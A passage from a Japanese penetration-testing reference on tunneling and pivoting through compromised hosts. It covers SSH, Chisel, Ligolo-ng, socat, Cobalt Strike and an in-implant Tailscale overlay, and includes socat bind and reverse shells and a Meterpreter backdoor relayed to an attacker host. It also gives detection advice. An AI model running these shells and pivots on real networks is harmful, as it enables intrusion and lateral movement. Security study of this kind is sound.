# トンネリングとポートフォワーディング

{{#include ../banners/hacktricks-training.md}}

ローカルのHTTPまたはTCPサービスをパブリックリレー経由で公開する方法については、[ローカルサービスをインターネットに公開する](expose-local-to-the-internet.md)を参照してください。この章では、ホスト間の転送とピボットについて説明します。

## Nmapのヒント

> [!WARNING]
> Nmapのプロキシ対応はTCP接続に限られ、ping、ポートスキャン、OS検出スキャンには影響しません。スキャナーがSOCKSプロキシの背後にある場合は、**ホスト検出を無効にし**（`-Pn`）、**TCP connect scan**（`-sT`）を使用してください。<sup>[[5]](#references)</sup>

## **Bash**

**ホスト -> ジャンプホスト -> 内部A -> 内部B**

最後のコマンドでは、Evil-WinRMの`-u`オプションでアカウントを、`-i`オプションでWinRMホストを指定しています。WinRMのデフォルトポートは5985です。<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSHは、暗号化チャネル経由でX11接続、任意のTCPポート、Unixドメインソケットを転送できます。<sup>[[6]](#references)</sup>

SSHのグラフィカル接続（X）

`-Y`は信頼されたX11転送を有効にし、`-C`は転送データの圧縮を要求します。<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

SSHサーバーで新しいポートを開く --> その他のポート

Remote（`-R`）フォワーディングはSSHサーバー上でリッスンし、ローカル側に接続します。明示的に指定したbind addressによって、そのリスナーに接続できるインターフェースが決まります。<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Local (`-L`) forwarding は client 側で待ち受け、SSH server 側から宛先に接続します。<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

ローカルポート --> 侵害されたホスト (SSH) --> 任意の接続先

Dynamic (`-D`) forwarding は、リモート側から接続を開始するローカル SOCKS4/SOCKS5 リスナーを作成します。<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### ProxyJumpを使ったマルチホップ

`-J`/`ProxyJump`は、カンマ区切りで指定した1つ以上のjump hostを経由してターゲットに接続します。転送オプションは最終的なSSH接続に適用されるため、以下のSOCKSリスナーは最初のbastionではなく、`internal-target`から接続先にアクセスします。これにより、jump hostにログインして2つ目のSSHクライアントを起動する必要がありません。<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

ジャンプホスト固有のオプションは `~/.ssh/config` に記述する必要があります。接続先向けのコマンドライン設定は、中継ホストには自動的に適用されません。<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

これは、内部ホストからDMZ経由で自分のホストにreverse shellを接続させる場合に便利です。

サーバーの `GatewayPorts` 設定は、remote forwardがloopback以外のアドレスにバインドできるかどうかを制御します。デフォルトは `no` です。<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

このrootベースの例では、両方のホストにトンネルデバイスを作成します。サーバーではtun forwardingを許可し、選択したアカウントがtunデバイスにアクセスできる必要があります。ここで`root`アカウントを使用する方法の1つは、`PermitRootLogin yes`を設定することです。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

サーバー側で転送を有効にする

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

クライアント側で新しいルートを設定する

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **セキュリティ – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 では、Terrapin による初期トランスポートの完全性攻撃に対抗するため、strict-KEX 拡張が追加されました。可能であれば両方のピアを更新し、古い実装については、転送されたチャネルがバージョンだけで保護されていると想定せず、ベンダーのガイダンスに従ってください。<sup>[[8]](#references)</sup>

## SSHUTTLE

ホストを経由して、**ssh** で **subnetwork** 宛てのすべての **traffic** を **tunnel** できます。\
たとえば、10.10.10.0/24 宛てのすべての traffic を転送できます。

`sshuttle` は SSH 経由の透過的なプロキシ機能を提供し、以下に示すように、サブネットとカスタム SSH コマンドを選択できます。<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

秘密鍵で接続する

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit の `portfwd` はローカルおよびリモートのフォワーディングに対応しています。一方、SOCKS プロキシモジュールはセッションルートまたは `autoroute` と連携することを想定しており、ここでの例ではデフォルトでポート 1080 をリッスンします。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

ローカルポート --> 侵害されたホスト（アクティブセッション） --> Third_box:ポート

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

別の方法:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt StrikeのBeaconは、Beacon経由でSOCKS4a/SOCKS5接続を中継できます。`rportfwd`は侵害されたホスト上でバインドし、`rportfwd_local`はCobalt Strikeクライアントから宛先への接続を開始します。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon経由でトラフィックをルーティングするインターフェース上で、Team Serverのポートを開きます。<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> この場合、ポートが開かれるのはTeam ServerではなくBeaconホストで、トラフィックはTeam Serverに送られ、そこから指定されたhost:portに転送されます。<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

リバースフォワーディングのマニュアルには、次の動作が記載されています:<sup>[[14]](#references)</sup>

- Beaconのリバースポートフォワードは、**個々のマシン間で中継するためではなく、Team Serverへトラフィックをトンネルするために設計されています**。
- トラフィックは、P2Pリンクを含むBeaconのC2トラフィック内で**トンネルされます**。
- 高いポート番号を使うと、通常は特権ポートの制限を回避できますが、対象OSのポリシーや既存のリスナーの影響は受けます。

### rPort2Port local

> [!WARNING]
> この場合、**ポートはTeam ServerではなくBeaconホストで開かれ**、**トラフィックはTeam ServerではなくCobalt Strikeクライアントに送信されます**。そこから指定されたhost:portへ転送されます。<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: アカウント不要のユーザー空間 TCP forwarding

Tailcat は、Tailscale の control plane を使わずに、WireGuard/NAT traversal/DERP の data plane を利用します。Tailscale アカウントも管理者権限も不要で、ホストのルートを追加したり DNS を変更したりしません。[Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) や、プロセス内で動作する [BOFScale tailnet](#bofscale---cdn-fronted-in-process-tailnet) とは異なり、サーバーは *tailcat address* を別の手段で共有します。クライアントはそのアドレスを使って、リモートノードが提供するポートに接続します。<sup>[[62]](#references)</sup>

リモートノードでポート `4444` を使う TCP サービスがすでに待ち受けている場合は、そこで `serve` を起動し、表示されたアドレスをクライアント側の `forward` に渡します。2つ目のコマンドはデフォルトで `127.0.0.1:18080` に bind するため、通常の TCP socket のみをサポートするローカルプロセスも、その loopback ポートに接続すれば、Tailcat 経由でリモートポート `4444` に通信できます。<sup>[[62]](#references)</sup> ポート番号は Tailcat 固有のものではありません。<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

アドレスにはサーバーの WireGuard 公開鍵と、現在のリリースではデフォルトで事前共有鍵が含まれます。認証情報として扱ってください。制限のないサーバーは、そのアドレスを知っているピアを受け入れます。一時アドレスはサーバーが終了すると使えなくなります。保存された `default` キーがあると、後続の実行でも通常の `serve` が同じアドレスを再利用するため、起動メッセージを確認し、アドレスが露出する可能性がある場合は `serve --allow` でクライアントを制限してください。<sup>[[62]](#references)</sup>

接続には、直接の UDP 経路または DERP relay を使用できます。これにより専用の C2 domain は不要になりますが、ネットワーク上のアクティビティが消えるわけではありません。<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - CDN-fronted in-process tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) は、TUN driver や service をインストールせずに、Windows C2 implant 内で改変版 Tailscale overlay を実行します。構成要素は、非同期 CGo `c-shared` `tailscaled` BOF-PE、local API と通信する小規模な C++ BOF-PE、そして非同期 `socksportfwd` TCP-to-SOCKS5 bridge の3つです。<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-compatible TS2021 and DERP

Tailscale は通常、Noise ベースの TS2021 control channel と DERP relay に独自の HTTP upgrade を使用します。BOFScale はその byte stream を維持しつつ、RFC 6455 WebSocket に格納し、`Sec-WebSocket-Protocol: ts2021` または `derp` を使用します。これにより、標準 WebSocket upgrade のみを受け入れる CDN の背後に、オペレーターが制御する Headscale/DERP origin を配置できます。改変された client は、HTTP `500` の後に TS2021 を WebSocket で再試行し、HTTP `426` の後に DERP を再試行します。また、DERP WebSocket dialer が host proxy 設定を尊重するようにします。BOF は、失敗することが分かっている最初の試行をスキップするために `TS_DEBUG_DERP_WS_CLIENT=1` を設定します。<sup>[[53]](#references)[[54]](#references)</sup>

CDN と origin proxy は、`/ts2021` と `/derp` の WebSocket upgrade を維持し、`/key` を通常の HTTP として転送し、relay session が無期限に開いたままになる可能性があるため、内部の read/write timeout を無効にする必要があります。付属の Headscale configuration は `verify_clients` を有効にし、オペレーターの埋め込み DERP map のみを公開し、Tailscale 運営の relay への fallback を防ぐため `derp.urls` を空にしています。<sup>[[53]](#references)[[54]](#references)</sup>

### In-process daemon and named-pipe control

上書きされない限り、BOF entry point は `-tun=userspace-networking`、`-state mem:`、`-no-logs-no-support` を指定して `tailscaled` を起動し、その後 UUID 名の pipe を作成します。Go の stdout/stderr は OS pipe 経由で Beacon output API に転送されるため、daemon と Go runtime 全体はメモリに常駐しますが、state と logs は Tailscale directory に書き込まれません。<sup>[[53]](#references)[[54]](#references)</sup>

軽量 client は、この pipe を介した Tailscale の HTTP/1.0 local API を再現します。daemon の `safesocket` layer は pipe client を impersonate するため、`SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` を指定して pipe を開き、`Tailscale-Cap: 125` を送信し、local API を `up`、`down`、`status`、route advertisement、shutdown 操作にマッピングします。<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> daemon に shutdown を要求した後、手動で map した Go BOF-PE を unload しないでください。runtime と garbage collector の goroutine が、loader によって unmap されたメモリから引き続き実行される可能性があります。`tailscaled` は使い捨てプロセスで実行し、最終的な cleanup ではそのプロセスを終了してください。<sup>[[54]](#references)</sup>

### Bridge host-originated traffic through userspace SOCKS5

受信した tailnet 接続と広告された subnet route は userspace network stack 内で機能しますが、侵害された host 上の通常の process には overlay への OS route がありません。そのため `socksportfwd` は victim 側の TCP port で listen し、daemon の `0.0.0.0:1080` listener と SOCKS5 `NO AUTH` をネゴシエートして、tailnet の宛先に対する `CONNECT` を発行し、両方向のデータを非同期に中継します。宛先が MagicDNS name の場合は `ATYP_DOMAIN` を使用するため、Windows resolver に name を公開せずに `tailscaled` が名前を解決します。<sup>[[53]](#references)[[54]](#references)</sup>

以下に最小限のオペレーター手順を示します。この CDN 構成を通過できないため、オペレーターノードと implant の両方で改変版 binary を使用する必要があります。<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

ローカルフォワードを使うと、認証を受け付けるように見えるリスナーとリレーツールを分離できます。マシンに侵害したホストのバインド済みポートへ認証させ、tailnet 経由で `ntlmrelayx` に転送し、AD CS、LDAP、HTTP、SMB、またはその他の互換性のあるターゲットへリレーします。脆弱性固有の段階については、[WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) と [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) を参照してください。BOFScale はトランスポートにすぎません。<sup>[[54]](#references)</sup>

### 検知

単独では弱い指標ではなく、複数の指標の組み合わせを探します。通常は Go ベースではないプロセス内の Go runtime、寛容な SDDL `D:(A;;GA;;;WD)` を持つ UUID パイプ、予期しない `0.0.0.0:1080` SOCKS リスナー、CDN アドレスへの長時間 TLS WebSocket 接続です。TLS インスペクションを行う場合、所有プロセスが認可済みの `tailscaled` サービスでないのに `Sec-WebSocket-Protocol: derp` または `ts2021` が使われていたら検知します。リポジトリの `bofscale.yar` ルールは、3つすべての BOF-PE コンポーネントのメモリシグネチャを提供します。<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

このプロジェクトは、`tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp`、`tunnel.php` などの Web トンネルエンドポイントを提供します。ローカルプロキシを起動する前に、対応するエンドポイントを1つアップロードします。<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) の releases page からダウンロードできます。\
Chisel は SSH で保護された接続を使用して、HTTP 経由で TCP/UDP トラフィックを転送します。互換性のある client/server ビルドを使用し、選択した release のコマンド構文を確認してください。<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### ポートフォワーディング

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) は、WebSocket、HTTP/2、または WebTransport（QUIC 上の HTTP/3）経由で、static または dynamic なポートフォワードを行います。現在のビルドでは、TCP、UDP、Unix ソケット、stdio、SOCKS5、HTTP proxy、Linux の透過 proxy リスナーを、forward モードと reverse モードの両方でサポートしています。<sup>[[52]](#references)</sup>

### リバース SOCKS5 pivot

attacker 側でサーバーを起動し、`-R` を使って pivot から外向きに接続させます。この方向では、SOCKS5 リスナーは **サーバー** 上に作成され、要求された接続は **クライアント/pivot** のネットワークから開始されます。<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

リバース静的フォワードも同じ方向に使用します。たとえば、次の例では、pivot から到達できる `10.10.10.20:445` を、攻撃者側の loopback ポート `8445` に公開します:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Egress と transport の詳細

- 明示的な HTTP proxy を経由するには、クライアントに `-p http://user:pass@proxy:8080` を追加します。`curl` などのクライアントでは `socks5h://127.0.0.1:1080` を使うか、アプリケーションで proxied DNS を有効にします。これにより、内部名はローカルの resolver に漏れることなく、トンネルの先で解決されます。<sup>[[52]](#references)</sup>
- `wss://` は TLS で保護された WebSocket を選択します。`https://` クライアントは HTTP/2 を選択しますが、reverse proxy/CDN によるバッファリングや HTTP/1 への変換によって双方向ストリームが一般に機能しなくなるため、このモードをテストする際は wstunnel サーバーを直接公開してください。<sup>[[52]](#references)</sup>
- `wts://` は QUIC 経由の WebTransport を選択します。`--enable-webtransport`（または `wts://` の listen URL）を使ってサーバーを起動し、待ち受けポートの UDP を許可してください。このモードは、TCP を運ぶ従来型の HTTP `CONNECT` proxy を経由できません。<sup>[[52]](#references)</sup>

> [!WARNING]
> 上流プロジェクトは、組み込みの自己署名証明書をプライバシー保護として扱わないよう警告しています。有効なカスタム証明書と `--tls-verify-certificate`（または mTLS）を使用し、リモートアクセスが意図的でない限り proxy のリスナーを loopback に限定してください。機密性が重要な場合は、すでにセキュアなプロトコルをトンネルしてください。<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng のクイックスタートでは、proxy 上の TUN interface、agent の証明書フィンガープリント検証、およびトンネル対象ネットワークの route 設定について説明しています。<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent Binding and Listening

Ligolo-ngでは、agent上にlistenerを追加してproxy側のアドレスへ転送でき、予約済みの`240.0.0.0/4`範囲をルーティングすることでagentローカルのサービスにアクセスできます。<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### エージェントのローカルポートにアクセスする

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivotは被害者側からリバーストンネルを開始し、攻撃者のループバックアドレス上にSOCKS4プロキシを公開します。READMEには、NTLMプロキシの認証情報とハッシュのオプションも記載されています。<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

**NTLM proxy** 経由でPivotする

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat は `TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL`、`PROXY` などのアドレス型を組み合わせます。以下の例では、ドキュメントに記載されたこれらのエンドポイントを組み合わせています。<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### SOCKS経由のPort2Port

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### SSL Socat 経由の Meterpreter

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

被害者のコンソールで最後の行の代わりに次のコマンドを実行すると、socatで文書化されている`PROXY`アドレスタイプを使って**認証不要のプロキシ**を経由できます。<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socatトンネル

**/bin/sh コンソール**

クライアント側とサーバー側の両方で証明書を作成する

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

ローカルの SSH ポート（22）を攻撃者ホストの 443 ポートに接続します。

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

PlinkはPuTTYのコマンドライン接続ツールで、`ssh`と同様のSSH転送オプションを備えています。<sup>[[22]](#references)</sup>

SSHポートには大文字の`-P`を使用します。`-pw`は互換性のために残されていますが、パスワードがプロセス一覧に表示されるため、可能であれば鍵認証または`-pwfile`を使用してください。<sup>[[22]](#references)[[23]](#references)</sup>

このバイナリは被害者側で実行されるSSHクライアントであるため、逆方向の接続に使うSSHサービスとポートを開放します。以下では`-R`を使い、ローカルからアクセス可能なポートを攻撃者のマシンに転送します。<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

永続的な `portproxy` ルールを作成または変更する際は、ホストで必要な権限を持つコンテキストを使用してください。Microsoft は、以下で使用する `v4tov4` の追加、表示、削除の形式をドキュメント化しています。<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### スケジュールタスク経由で`portproxy`をデプロイする

管理者資格情報が利用できる場合、リモートのタスクスケジューラを実行して、専用のリレーをアップロードせずにネイティブのフォワーディングルールをインストールできます。たとえば、[Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md)を使うと、ピボットでTCP/443をリッスンし、内部のSMBサービスに接続を中継できます。<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

このルールは永続するため、`netsh interface portproxy show v4tov4` で列挙し、テスト後に明示的に削除してください。`portproxy` が提供するのは転送機能のみです。ホストのファイアウォールでもリスニングポートを許可する必要があります。<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

**システムへの RDP アクセスが必要です**。\
ダウンロード:

SocksOverRDP は Remote Desktop Dynamic Virtual Channels を使用して、既存の RDP セッション経由で SOCKS5 接続を転送します。クライアントプラグインは `127.0.0.1:1080` でリッスンし、サーバーコンポーネントは RDP ターゲット上で実行されます。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - このツールは、Windows の Remote Desktop Service 機能に含まれる `Dynamic Virtual Channels` (`DVC`) を使用します。DVC は **RDP 接続経由でパケットをトンネリング**します。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

クライアントコンピューターで、次のように **`SocksOverRDP-Plugin.dll`** を読み込みます:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

これで **RDP** を使って **`mstsc.exe`** から **victim** に **connect** できます。**SocksOverRDP plugin is enabled** という **prompt** が表示され、**127.0.0.1:1080** で **listen** するはずです。

**RDP** で **connect** し、`SocksOverRDP-Server.exe` バイナリを victim のマシンにアップロードして実行します。

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

次に、マシン（攻撃者側）でポート1080が待ち受けていることを確認します。

```
netstat -antb | findstr 1080
```

これで[**Proxifier**](https://www.proxifier.com/)を使い、トラフィックをそのポート経由でプロキシできます。<sup>[[26]](#references)</sup>

### RDP仮想チャネルのハンティング

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling)もRDP仮想チャネルのトンネルで、デフォルトのチャネル名は`rdp2tcp`ですが、オペレーターは別の名前を選択できます。<sup>[[56]](#references)</sup> チャネルの作成と終了は、`Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational`にイベントID **132**および**148**として記録されます。`rdp2tcp`や、まれなチャネル名・ランダムなチャネル名を探し、`XPSRD`、`cliprdr`、`Microsoft::Windows::RDS::DisplayControl`などの想定されるチャネルと比較してください。<sup>[[58]](#references)</sup>

## Windows GUIアプリをプロキシ経由にする

[**Proxifier**](https://www.proxifier.com/)を使うと、Windows GUIアプリをプロキシ経由で通信させることができます。<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers**で、SOCKSサーバーのIPアドレスとポートを追加します。\
**Profile -> Proxification Rules**で、プロキシ経由にするプログラム名と、プロキシ経由にする接続先IPアドレスを追加します。Proxifierのルールでは、アプリケーション、接続先ホスト、ポートを条件にできます。<sup>[[27]](#references)</sup>

## NTLMプロキシ経由のトンネル

